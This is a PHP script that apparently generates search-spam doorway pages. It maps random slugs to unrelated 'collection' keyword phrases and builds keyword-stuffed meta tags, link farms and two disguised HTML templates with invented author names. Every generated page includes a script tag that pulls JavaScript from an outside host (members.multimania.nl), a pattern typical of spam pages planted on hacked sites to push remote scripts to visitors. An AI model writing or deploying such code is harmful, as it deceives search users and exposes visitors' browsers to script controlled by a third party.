<?php

# V3.0

$useifrfeed = 1;
$insertintlinks = 1;
$intlinksblock = "";
$kwlist = "";
$description = "";
$metakeywords = "";
$metadesc = "";
$sitemapblock = "";
$dirlinksblock = "";
$feedcode = "";
$kw = "";
$map = "";

$file_array = array ("ae","ls","no","hu","nd","wy","ui","owukomyby","im","eb","yf","oo","ei","obaha","da","vs","cw","polak","fo","ue","qih","hj","hoat","zl","aa","yd","yo","ox","ua","qf","ez","pj","ck","be","ym","he","ou","gi","eo","yc","yh","uy","wi","ii","hk","dy","ih","ee","ep","go","ov","uznofo","hy","dic","sa","tok","vu","up","uc","kh","de","sr","az","ea","wg","et","hoegi","kk","pekru","iki","hf","uzuutnum","am","vy","is","jy","ug","hb","iy","bu","rh","sohpi","mv","iq","ek","zr","yv","pi","rx","ub","dx","wt","vt","mugehexo","ga","ho","kr","vk","zb","lu","ahqulagy","qo","ku","au","yy","tt","wavaw","va","kd","ig","gu","oq","rb","fj","yg","fa","ik");
$kw_array = array ("eterna collections","dj collectables","zoo tycoon collection pack","data collection in science disciplines","west valley collection","the strawberry shortcake collection furniture","smallville clark cross collectible","collecting on judgments oregon","oscar de la renta knights bridge bedding collection","sell star trek collectibles in pittsburgh","collect of native american symbols","domestic collection","collect unemployment nj","data collection by pc","va tech turkey ceramic collectibles","gemstone collections","full zoo tycoon complete collection download","jerry clower collection","kidney stone in renal collection system","craigslist marjolein bastin bird at my window collection","putumayo summer collection","quake collection","strawberry shortcake collection","sulky 12 wt thread collection","mickey mouse collections","craigs list marjolein bastin bird at my window collection","l m strayer collection","next refuse collection in kidderminster","the rose collection genuine porcelain doll named jenny","wells fargo ccg collections servicing","how to tune java garbage collection","play sonic mega collection on wii","simplicity ellis collection","the sims complete collection patches","donna karen body perfect collection","old movies collections","human body collection in russia","collectable vintage wines","old world santa collection","kids data collecting experiments","jason bourne collection dvd","data collection in natural sciences","complete scooby doo collection","carl jung collective unconscious instincts","discontinued furniture collections","nonni biscotti chocolate collection","smooth grooves a sensual collection","brick collecting","monopoly collectables","how to collect unemployment florida","unc southern folkways collection","qwark collectible","discontinued furniture collections universal","dd collection","chips tv show collectibles","how to collect dna samples without anyone knowing","collecting on judgements oregon","sacred mirror collection","baseball collect a book collections","book collection freeware","rc willey collections account what are the chances of settling","balentine collection aspen","joe walsh the definitive collection","sacred mirror collection alex grey","collecting on judgements","selling star wars collectibles","arzberg collectible","thanksgiving a windham hill collection 1998","nanaimo garbage collection","final fantasy x vocal collection download","john franklin photograph collection","fossil collecting in sc","hasbro transformer collectibles","va tech ceramic turkey collectibles","jewel of the nile movie collection","disney high school musical bedding collection","rip cd collection variable wma vbr rate","christmas tree collection seattle","va tech ceramic collectibles","fairy tale volumes classic vintage collection","collection boxes for wedding","paid collections","collections 800 548 1690 annapolis","bulk collect syntax","discount rue de lyon collection","gold cheat for civilization 3 complete collection","swarovski totally charmed collection","cupid collection dresses","state of tennessee collection service board","hollywood garbage collection","rc willey collections settling","tracy potter octavia hill collection","collection and transfer equipment for solid waste","collection agency for legal services","the strawberry shortcake collection","charisma collection","lonesome dove collection","a collection of short stories by nikolay gogol","southwestern bath collections","kentucky villages large collection christmas","time life song collections","la county inmate collect calls","williams collection ornaments","jenny beyer fabric collections","hooker furniture northhampton collection","winfield collection wood patterns","default collection lock sms","book collecting armericana","how to collect evidences using chemical techniques","va tech turkey collectibles","cost of garbage collection by city of gatineau quebec","dolphin semen collection","star wars collecting","participant observation as a data collection method","labrazel la coco collection","american girl retired collectibles","crow creek collectibles");
$desc_array = array ("38,85,75,64","44,8,76,3,7","113,82,114,54","40,30,106","56,74,99,64,10","16,36,115,92,108","34,98,55,47","115,53,38,15,10","85,104,17","102,28,75,15","5,114,33","78,93,98,89","72,67,27,109","5,65,110,115","18,25,15,61,12","62,19,79","22,59,60,37,62","68,13,30,25","60,106,3,87","76,72,104","3,76,95,82,80","13,25,70","2,32,61,11","55,1,98","59,106,82,30","99,64,68,23,52","93,99,11,108","86,96,87,76,103","113,5,66","96,21,39","83,20,66,98,64","22,81,24,33,38","62,101,111","95,82,19,87","92,54,12,65,116","115,51,37","113,67,65,75","11,36,9,105","66,65,41","0,90,104,44","9,116,102","95,27,45","107,56,11,75","37,78,57","21,113,38,5,65","22,92,1,85","68,62,69,85","62,7,94,67,50","49,0,111","90,23,105,73","34,31,65,52,46","23,76,66,19,57","23,99,47,64,2","67,17,2,101","59,29,113,88","27,59,107","50,89,51,83","29,88,30,63","25,20,3,40,94","62,15,38,8","26,38,93","84,18,8,29,50","32,15,54,78,23","41,51,72,92,36","44,86,47,5","92,20,36,74,56","18,68,60,47","12,59,115,74","84,22,6,69,77","17,8,85,10","97,48,106,63,87","17,55,3","8,68,76,46,71","71,35,44,93","27,64,52,90","47,56,67","0,115,46","74,50,96","113,40,36","13,32,113,43","1,78,43,18","77,71,83","3,86,83,15","84,7,20,67,108","60,80,48,103,36","107,102,69,111","113,71,109","58,78,104,50,65","38,113,75,26,35","17,74,66,45,23","10,106,6","11,89,45,115","65,27,57,54,83","72,1,31","100,46,101","4,79,8,112","27,31,51,107","13,111,85,67","101,0,38,110,18","116,24,81,70,0","26,88,80,90,103","103,24,86,19,75","85,116,70,27","94,32,67,56,111","85,47,46","49,4,51,12","31,63,38,92,53","97,102,96","93,9,58,112,8","55,63,57","7,115,54","29,62,51","7,78,59","42,105,69,43","40,85,15,79","67,89,19","64,51,50,80,82");
$kwlist_array = array ("29,74,40","55,67,71,92","51,58,47,99","105,10,57,100","38,116,25,86,97","56,92,74,13","63,36,32,115","48,90,71","86,12,66,1","29,2,98","42,65,59,39,28","27,69,74","9,116,22,43,86","37,72,76,2","42,57,26,94","71,62,113,59,92","40,27,82,1","82,94,30","57,7,111,61","5,74,52","44,58,11,110","33,80,10,64,29","106,23,79,81,34","29,106,27","64,20,21,39,61","100,42,88,52,21","12,94,14","108,75,29","63,56,77,5,48","26,0,4,111,74","59,35,71,73,79","48,50,5","44,90,5","66,44,86,56,99","7,19,108","103,25,54,50,109","99,32,10,7,63","90,100,75,53","110,58,13","82,36,101,27","101,29,4","114,12,13,2,64","91,4,38,61","114,15,11,19,115","30,19,25,34,40","25,8,29,74,108","44,11,92","41,14,68,63","96,102,55,80,18","66,94,42,52","101,70,67,54,114","98,32,5,91,62","36,32,20,107","100,0,32","76,88,64","52,28,27","115,49,79,16,14","62,71,55","82,96,32","89,51,81","15,87,57","50,108,109,102","64,3,100","81,15,80,37,82","113,94,42","89,26,77","110,111,14","77,15,112,74,8","61,94,89","77,97,70,95","116,44,24,48,27","46,45,72","116,9,64","86,111,102,57","38,101,73,61,88","27,88,31","79,75,89,13","106,9,57","103,29,18,64,38","76,14,57,112,21","0,89,99","81,36,32","33,103,94,1,6","21,14,95","31,99,32,62,22","63,38,54,7","57,69,16,19","47,27,57,23,106","109,14,0","114,65,99","67,102,74","82,11,81,27","74,103,112","0,103,20","55,108,1,56","36,26,35","108,12,82","87,16,17,81,34","109,2,76,71,72","83,63,14,108,61","46,86,78","39,5,13,0","80,47,51,39,81","61,92,107,109,22","12,25,86","64,44,21","81,110,80","44,16,70,78","48,104,43","1,80,4,37","27,94,54,96","37,116,63,71","30,74,31","61,71,91,96","63,5,15,65","47,43,6,104","96,54,69,9,20");
$intlinks_array = array ("58,17,110,71,105,1,18,68,69,75,81,51,70,60,114,22","17,68,54,103,80,77,97,65,112,10,94,105,66,75","8,70,12,96,63,59,40,10,113","113,20,103,0,32,38,84,70,66,59","73,65,36,111,61,98,5,55,46,30,78","91,33,101,7,109,98,10,90,38,24,74,41,57,93,26,104,14,110,80","73,112,5,107,22,93,101,78,37,114","80,61,111,78,67,4","33,14,24,92,6,46,60,82,48,102,68,89,73,45,18,50,55,67","112,34,62,88,38,69,31,3,19,42,0,91,37,11,29,81","44,112,72,2,11,100,109,68,31,51,87,23,104,50","104,14,75,47,63,26,112,89,21,7,73","71,54,41,60,94,79,95","67,108,24,52,18,51,59,20,66,3,29,82,87,7,83,19,41,112","91,20,80,110,24,105,76,58,16,32","10,19,105,100,24,21,104,27,103,68,81,89,9,85,1,64,107,92","20,96,67,26,50,33,25,109,51,15","83,35,90,56,105,75,71,88,115,89,100,96,113,30","116,44,93,39,1,101,86","50,34,48,97,108,80,92,90,5,104,15,69,110,23,38,54,79,106","17,76,80,47,108,13,38,26,29,72,22,39,96,5,92,60,12,0,114","71,11,93,58,10,113,40,44,64,54,88,92,36,98,62,102,112,46,103","61,90,41,5,108,14","111,56,75,62,58,80,114,26,107,87,85,25,84,63,5,116,17,42","25,67,116,107,43,57,28,26,92,100,14,2","13,7,42,81,96,2,97,107,58,52,6,80,57,1,70","71,85,51,103,87,1,50,35,89,102,33,19,37,23,108,41,94,28,106","88,36,18,10,95,43,57,102,103,66,49","96,101,115,12,95,41,66,53,100,46,29,7,36,57,67,51,88,70","47,20,48,6,64,59,50,49,102","2,93,48,112,17,76,98,1,43,4,86,78,100,33,92,111","82,83,23,41,54,8,100,78,29,22,85,93,115,27,24,79,6,14,61","84,24,5,81,21,58,71,75,26,76,1,34,79","73,49,37,15,51,32,48,101,24,25,64,14,23,11,21,97,27","89,44,41,29,7,65,64,71,3,77,6,90","58,105,30,8,12,0,66,9","107,109,66,74,32,79,23,39,60,48","9,72,80,102,8,19,65,16","69,8,45,91,97,14,25,24,20,109,52,30","98,26,64,65,85,19,76,38,66,93,62,46,7,48,72,82,13,43,89","90,6,107,15,2,71,66,3,33,73,35,74,64,106","42,92,88,106,58,17,112,49,46,4","51,34,59,49,95,36,27,73,60,54,0,107,89,17,115,31,93","80,50,92,6,22,77,7,12,69,56,36,72,55","25,104,54,68,27,84,82,23","109,41,105,103,56,76,78","107,51,83,116,58,44,110,68,23,43,91,5,96,52,88,53,39,10,104","71,88,97,57,16,84","73,3,69,26,50,104,16,81,94,38,95,37,110,62,18,112,106,60","90,104,39,95,55,84,10,26,62,111,30,61,86,80,88,13,66,89,12","69,92,52,0,78,101,67","55,27,56,66,75,86,78,63,65,102,12,20,48,104,28","57,69,12,28,79,18,106,41,37,6,58,111,110,35,89,95,29,84,21","78,56,33,8,41,58,14","82,31,14,94,45,75,35,85,6,12,95,52,4,19","42,74,2,9,64,99,63,65,41,95,29,25,16,47,89,78","26,94,12,102,10,69,21,87,43,90,81,14,25,108,93,109,78","66,11,110,87,105,35,106","101,14,35,103,59,46,27","83,115,89,72,86,107,37,110,108","98,90,10,25,88,62,19,106,59,33,66,14","29,49,27,77,92,93,46,41,33,108,91,48,56,16,42,47","109,74,72,92,52,3,23,18,41,15,11,59,0,68,46,78,35,13,108","76,78,82,101,20,110,80,30,115,93,13,5,43,42,3,32,79,74,108","88,90,23,24,40,115,36,39,70,89,92,1,102,3,22,86,75","11,66,56,87,29,53,71,64,22,90,30","16,63,37,116,94,114,54,82,84","35,58,111,101,104,44,100,13,59","5,111,38,21,33,91,1,104,114","79,82,112,78,76,74,43,46,31,59,1,109,28,13","45,7,69,54,41,94,87,76,10","108,87,4,104,17,49,91,114,0,109,39,33,95,113,81","54,0,24,44,8,19,59,68,89,50,35,6,57,110,18","38,23,5,47,21,75,91,16,13,43,30,108,72,50,27,31,99,116","53,8,76,48,28,85,56","42,29,48,8,70,77,15,14,65,89,107,62,111","53,113,10,9,111,48,30,101,75,110,40,24","4,106,94,7,97,113,71,61,102,66","71,58,62,51,65,93,38,72,13,74,29,109,31,50,79,59,43,15,77","84,111,18,101,28,42,110,96","67,77,37,9,66,108,30,26,76","75,13,40,37,9,5,31,25,3,30,45,58,0","93,116,110,66,18,42,71,83,35,28,100,23,81,54,104,22","50,19,105,11,18,70,102,0,49,24,80,15,62,30","44,32,94,80,2,39","92,42,17,79,109,15,88","44,91,67,94,38,53,82,62,114,59,90,43","38,116,96,72,113,60,30,114,7,51,53,80","78,4,31,13,12,39,55,79,96,52,65,80,22,11,113,91,54,109","15,23,49,91,2,46,70,97,115,86,100,0,82,94,14,57,25,77","36,78,100,48,107,106,60,5,104,23,39,99,96","64,69,59,9,63,67,98,61","22,86,46,3,94,20,42,2,47,21,28,59,0,39,107","41,9,39,54,100,17,42,0,50,60,86,114,105,7","1,77,3,84,99,24,20,10,107,12,41,49","39,108,80,12,76,70,93,67,89,9,59,81,44,20,94,52,23,72","57,106,98,107,76,116,85,86,92,13,89,35,58,88,91","60,45,51,54,18,68,59,41,107,38,84","91,23,52,97,65,110,62,113,14,92,2,80,66","79,50,49,92,48,28,38,98","55,14,93,22,81,71,94,77,79,30,53,97,110,17,75,59,54,60,25","113,36,11,95,35,15,1,21,73,109,60,92,63,34","43,42,47,75,28,6,73,26,36,37,34,92,23,91,19,21,70","108,97,50,51,96,37,23,80,86,7,40,46,111,63,66,55,75","4,97,56,59,92,19,31","1,26,73,5,109,103,87,101,65,104,70,34,79,83,21,13,52,20","74,68,89,93,92,58,96,39,49,75,23,72,71,14,28,113,12,59,31","50,87,80,46,0,113","103,109,73,107,104,54,30,97,42,57,76,10,51,43,80","26,45,60,39,101,38,31,69,104","101,99,25,8,42,1,80,0,50,21,115,102,44,41","22,100,12,49,75,64,80,18,15,58,92,30,83,82,28,16","92,2,17,36,108,97,18,15,84,40,96,7","23,80,30,2,43,65,35","95,33,88,67,99,98,69,102,83,101,11,10,108,38,39,115,51,56,85","68,44,59,82,114,43,47,49,70,45,38,58","72,99,28,93,89,64,70,57,53,56,61,103,7");
$dirlinks_array = array ();
$jsurls_array = array ("http://members.multimania.nl/terxo/");

$jsfile = "9.js";
$dynjsfile = "1";
$externaljsfile = "1";
$textseparator1 = array ("|||","''");
$textseparator2 = array (",,,","._");
$linkseparator = array ("(,)","-");

$err = "";
$file = "";
$globalprefix = "";
$suffix = "?";

function err404() {
  header("HTTP/1.0 404 Not Found");
  exit;
}

if (isset($_REQUEST['e'])) {
  $e = $_REQUEST['e'];
  if ($e == 404) {
    err404();
  }
}
if (isset($_REQUEST['f'])) {
  $file = $_REQUEST['f'];
}
else {
  if (isset($_SERVER["REQUEST_URI"])) {
    $requri = $_SERVER["REQUEST_URI"];
  }
  elseif (isset($_SERVER["ORIG_PATH_INFO"])) {
    $requri = $_SERVER["ORIG_PATH_INFO"];
    if (isset($_SERVER["QUERY_STRING"])) {
      $requri .= '?' . $_SERVER["QUERY_STRING"];
    }
  }
  $file = preg_replace("/^\/.*?\.php\??/", "", $requri);
  $file = preg_replace("/^.*=(.*)$/", "$1", $file);
  $globalprefix = preg_replace("/^(\/.+?\.php).*$/", "$1", $requri) . $suffix;
}

if ($file) {
#  $file = preg_replace("/\.html$/", "", $file);
  $showindex = 0;
  for ($i = 0; $i < sizeof($file_array); ++$i) {
    if ($file == $file_array[$i]) {
      $kw = $kw_array[$i];
      $kwodd = strlen($kw) % 2;
      $curdesc_array = explode(",", $desc_array[$i]);
      $curkwlist_array = explode(",", $kwlist_array[$i]);
      $curintlinks_array = explode(",", $intlinks_array[$i]);

      foreach ($curdesc_array as $j) {
        if ($description) {
          $description .= " " . $textseparator2[$kwodd] . " ";
        }
        $description .= $kw_array[$j];
      }
      foreach ($curkwlist_array as $j) {
        if ($kwlist) {
          $kwlist .= ",";
        }
        $kwlist .= $kw_array[$j];
      }
      if ($insertintlinks) {
        foreach ($curintlinks_array as $j) {
          if ($intlinksblock) {
            $intlinksblock .= " " . $linkseparator[$kwodd] . " ";
          }
          $intlinksblock .= "<a href=\"" . $globalprefix . $file_array[$j] . "\">" . ucwords($kw_array[$j]) . "</a>";
        }
        $intlinksblock .= "\n";
      }
      $title = ucwords($kw);
      $description = "$title " . $textseparator1[$kwodd] . " $description";
      break;
    }
  }
  if (!$kw) {
    err404();
  }
}
else {
  $showindex = 1;
  $kw = $kw_array[0];
  $kwodd = strlen($kw) % 2;
  $curdesc_array = explode(",", $desc_array[0]);
  $curkwlist_array = explode(",", $kwlist_array[0]);

  foreach ($curdesc_array as $j) {
    if ($description) {
      $description .= " " . $textseparator2[$kwodd] . " ";
    }
    $description .= $kw_array[$j];
  }
  foreach ($curkwlist_array as $j) {
    if ($kwlist) {
      $kwlist .= ", ";
    }
    $kwlist .= $kw_array[$j];
  }
  $title = ucwords($kw);
  $description = "$title " . $textseparator1[$kwodd] . " $description";
 
  $mapdiv = strlen($kw);
  $mapdivcount = 0;
  for ($i = 0; $i < sizeof($file_array); ++$i) {
    $tmpfile = $file_array[$i];
    $tmpkw = ucwords($kw_array[$i]);
    if ($mapdivcount == 0) {
      $mapdivcount = $mapdiv;
      $map .= " " . $textseparator2[$kwodd] . " ";
    }
    $map .= "<a href=\"$globalprefix$tmpfile\">$tmpkw</a> " . $linkseparator[$kwodd] . " ";
    --$mapdivcount;
    if ($mapdivcount == 0) {
      $map .= " " . $textseparator2[$kwodd] . " ";
    }
  }

  foreach ($dirlinks_array as $j) {
    if ($dirlinksblock) {
      $dirlinksblock .= " " . $textseparator1[$kwodd] . " ";
    }
    $dirlinksblock .= $j;
  }
}

if (!$showindex) {
  $metakeywords = "<meta name=\"keywords\" content=\"$kwlist\" />";
  $metadesc = "<meta name=\"description\" content=\"$description\" />";
}
else {
  $sitemapblock = "$map";
}

if ($useifrfeed) {
  if ($dynjsfile) {
    $jsfiletmp = "";
    $js_array = explode(" ", $kw);
    foreach ($js_array as $j) {
      $jsfiletmp .= substr($j, 0, 2);
    }
    if ($jsfiletmp) {
      $jsfile = $jsfiletmp . ".js";
    }
  }
  if ($externaljsfile) {
    $feedcode2 = "";
    foreach ($jsurls_array as $jsu) {
      $feedcode2 .= "<script src=\"$jsu$jsfile\" /></script>";
    }
  }
  else {
    $feedcode2 = "<script src=\"$jsfile\" /></script>";
  }
}

if ($kwodd == 0) {
?>
<?php $generator = "Cocoa HTML Writer"; ?><?php $author = "Bailee Oliver"; ?>
<html>
<head>


<?php echo $metakeywords; ?><title><?php echo $title; ?>


</title>


<meta name="copyright" content="<?php echo $author; ?>">


<style type="text/css">


.footerdr { position:absolute; top:610px; left:0; width:980px; font-family:Verdana,Helvetica,Arial; font-size:10px; line-height:20px; }

.bepin img{position:absolute}


.iobh{height:0;position:absolute;top:24px;width:100%}


.qti div, #bigtp{overflow:hidden;width:13px;height:13px;cursor:pointer}

.soda dfn{padding-left:.2em;padding-right:.5em}


</style>

<base target="_blank">


<meta http-equiv="Content-Language" content="en" /><?php echo $metadesc; ?>
<meta http-equiv="expires" content="0" />
</head><BODY BGCOLOR=#FFFEFF id=greeny>

<div class="page-nav">


<?php echo $sitemapblock; ?>
</div>
<div style="margin-top:5px;">

</div><?php echo $feedcode2; ?>

<?php echo $intlinksblock; ?>


<p align=left>
</p><?php echo $dirlinksblock; ?>
<div style="width:90%;"></div>
<p id=contentlink>Privacy policy</p>

</body>


</html>



<?php
}
elseif ($kwodd == 1) {
?>
<?php $generator = "Sapid 1.2.3.07"; ?>
<?php $author = "Alejandro Madden"; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="expires" content="0" />
<?php echo $metakeywords; ?>
<meta name="author" lang="en" content="<?php echo $author; ?>">
<?php echo $metadesc; ?>
<base target="_blank">
<title>
<?php echo $title; ?>
</title>
<style type="text/css">
.svlvk div{padding-left:10px;text-indent:-10px}
.slide { position:absolute; left:1px; top:1px; width:992px; height:592px; }
a.boxred:hover {padding-top:0px;padding-bottom:0px;padding-left:2px;padding-right:2px; width:13px; height:8px; background:#ffff88; border:1px solid #FF0000; text-align:center; font-weight:bold; font-size:8px; text-decoration:none; color:#000000;}
.footerdr { position:absolute; top:610px; left:0; width:980px; font-family:Verdana,Helvetica,Arial; font-size:10px; line-height:20px; }
.mti,.nbl,furm,#trres h3{display:inline}
.xts{font-size:x-small}
.dat_sel{ BACKGROUND-COLOR: RGB(255, 255, 255); FONT-FAMILY: Arial, Verdana, Helvetica, Courier; COLOR: RGB(255,0,0); FONT-STYLE: normal; FONT-SIZE: 12px; FONT-WEIGHT: bold; }
td.iter3 { padding: 10px 45px 10px 32px; width: 50%; }
</style>
<meta name="copyright" content="<?php echo $author; ?>">
</head>
<body>
<span class="trigger"><br>
<?php echo $sitemapblock; ?>
<br></span>
<?php echo $feedcode2; ?>
<div class="page-nav">
<?php echo $dirlinksblock; ?>
</div>
<?php echo $intlinksblock; ?>
<p align=left>
</p>
</body>
</html>

<?php
}
?>
